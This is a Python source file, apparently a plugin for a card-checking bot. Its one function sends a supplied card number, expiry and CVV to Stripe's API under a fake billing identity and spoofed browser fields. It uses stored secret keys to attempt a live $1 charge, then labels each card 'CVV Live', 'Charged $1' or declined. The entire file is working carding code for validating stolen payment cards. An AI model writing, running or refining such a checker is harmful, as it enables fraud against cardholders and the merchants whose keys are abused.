import uuid
import random
import httpx
from plugins.utility.db import get_skpk

async def skintoff(session, cc, mm, yy, cvv):
    max_amt = 0
    max_retry = 5

    sk_key, pk_key = await get_skpk()
    url = "https://api.stripe.com/v1/payment_methods"

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded',
        "Authorization": f"Bearer {pk_key}",
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }

    data = {
        "type": "card",
        "billing_details[name]": "Ayan XD",
        "billing_details[address][city]": "Los Angeles",
        "billing_details[address][country]": "US",
        "billing_details[address][line1]": "1234 Street",
        "billing_details[address][postal_code]": "90001",
        "billing_details[address][state]": "CA",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": str(uuid.uuid4()),
        "muid": str(uuid.uuid4()),
        "sid": str(uuid.uuid4()),
        "payment_user_agent": "stripe.js/fb7ba4c633; stripe-js-v3/fb7ba4c633; split-card-element",
        "time_on_page": random.randint(10021, 10090),
    }

    attempts = 0
    while True:
        if attempts >= max_retry:
            return "Max retry reached due to proxy or connection issues (payment_methods)"

        try:
            result = await session.post(url=url, headers=headers, data=data)
        except (httpx.RequestError, httpx.ConnectError, httpx.ReadTimeout) as e:
            attempts += 1
            continue

        text = result.text
        if "Invalid API Key provided" in text or \
           "testmode_charges_only" in text or \
           "api_key_expired" in text or \
           "Your account cannot currently make live charges." in text:
            return 'api_key_expired'

        if "Request rate limit exceeded." in text:
            max_amt += 1
            if max_amt == max_retry:
                return "429 Too Many Requests"
            continue
        else:
            break

    try:
        response_json = result.json()
        payment_method_id = response_json["id"]
    except:
        return '[sk_based] => Unexpected response (no ID)'

    url = "https://api.stripe.com/v1/payment_intents"
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded',
        "Authorization": f"Bearer {sk_key}",
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    }

    data = {
        "amount": 100,
        "currency": "usd",
        "payment_method_types[]": "card",
        "payment_method": payment_method_id,
        "confirm": "true",
        "off_session": "true",
        "use_stripe_sdk": "true",
        "description": "None",
        "receipt_email": 'xhfuhuduburyg@gmail.com',
        "metadata[order_id]": str(random.randint(100000000000000000, 999999999999999999)),
    }

    attempts = 0
    while True:
        if attempts >= max_retry:
            return "Max retry reached due to proxy or connection issues (payment_intents)"

        try:
            response = await session.post(url=url, headers=headers, data=data)
        except (httpx.RequestError, httpx.ConnectError, httpx.ReadTimeout) as e:
            attempts += 1
            # log or handle the error as needed
            continue

        text = response.text
        if "Invalid API Key provided" in text or \
           "testmode_charges_only" in text or \
           "api_key_expired" in text or \
           "Your account cannot currently make live charges." in text:
            return 'api_key_expired'

        if "Request rate limit exceeded." in text:
            max_amt += 1
            if max_amt == max_retry:
                return "429 Too Many Requests"
            continue
        else:
            break

    try:
        json_res = response.json()
        if 'requires_action' in text or 'requires_source_action' in text:
            return '3D Secure Required'
        if '"cvc_check": "pass"' in text or '"cvc_check":"pass"' in text:
            return 'CVV Live'
        if 'error' in text:
            if 'decline_code' in json_res['error']:
                msg = json_res['error']['decline_code'].replace('_', ' ').title()
                return msg
            else:
                return json_res['error']['message']

        elif 'succeeded' in text or (json_res.get('status') == 'succeeded') or 'success:true' in text:
            return 'Charged $1'
        else:
            return '[sk_based] => Unexpected response'
    except:
        return '[sk_based] => Unexpected response'
